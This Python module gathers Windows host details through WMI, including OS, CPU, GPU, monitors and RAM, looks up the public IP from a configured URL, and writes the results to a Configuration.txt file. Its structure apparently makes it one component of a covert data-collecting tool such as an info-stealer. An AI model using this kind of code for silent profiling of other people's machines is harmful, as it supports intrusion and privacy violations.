from os import mkdir, path
from multiprocessing import Process
from urllib.request import Request, urlopen

from win32com.client import GetObject
from win32api import EnumDisplayMonitors, GetMonitorInfo

from ..helpers.config import SystemConfig


class System(Process):

    def __init__(self, storage_path: str, folder: str, errors: bool):
        Process.__init__(self)

        self.config = SystemConfig()
        self.storage_path = storage_path
        self.folder = folder
        self.errors = errors

    def __create_folder(self):

        storage_path = rf"{self.storage_path}\{self.folder}"

        if not path.exists(storage_path):
            mkdir(storage_path)

    def __get_system_info(self):

        win = GetObject("winmgmts:root\\cimv2")

        data = self.config.SystemData
        os_info = win.ExecQuery("Select * from Win32_OperatingSystem")[0]
        cpu_info = win.ExecQuery("Select * from Win32_Processor")[0].Name
        gpu_info = win.ExecQuery("Select * from Win32_VideoController")[0].Name
        monitors_info = ", ".join(f"{monitor['Device'][4:]} {monitor['Monitor'][2]}x{monitor['Monitor'][3]}" for monitor in [GetMonitorInfo(monitor[0]) for monitor in EnumDisplayMonitors()])

        try:
            net_info = urlopen(Request(method="GET", url=self.config.IPUrl)).read().decode("utf-8")
        except:
            net_info = "Error"

        with open(rf"{self.storage_path}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:

            system.write(data.format(
                self.config.User,
                net_info,
                os_info.Name.split('|')[0],
                os_info.Version,
                os_info.BuildNumber,
                monitors_info,
                cpu_info,
                gpu_info,
                round(float(os_info.TotalVisibleMemorySize) / 1048576)
            ))

    def run(self):

        try:

            self.__create_folder()
            self.__get_system_info()

        except Exception as e:
            if self.errors is True: print(f"[System]: {repr(e)}")
